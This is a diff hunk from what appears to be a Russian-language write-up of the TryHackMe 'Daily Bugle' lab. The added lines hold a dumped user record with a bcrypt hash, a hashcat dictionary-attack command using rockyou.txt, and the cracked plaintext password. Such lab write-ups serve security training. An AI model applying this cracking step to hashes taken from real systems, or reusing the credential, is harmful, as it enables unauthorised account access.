@@ -92,7 +92,12 @@ Disallow: /tmp/
 
 ## 🕵️ Enumeration
 
-
+>> 811 ||| Super User ||| jonah ||| jonah@tryhackme.com ||| $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
+```
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - DailyBugle/exploits]
+└─$ hashcat -m 3200 -a 0 hash.txt /media/sf_Exchange/Dictionaries/rockyou.txt 
+```
+$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
 
 ## 📂 Получение доступа
 
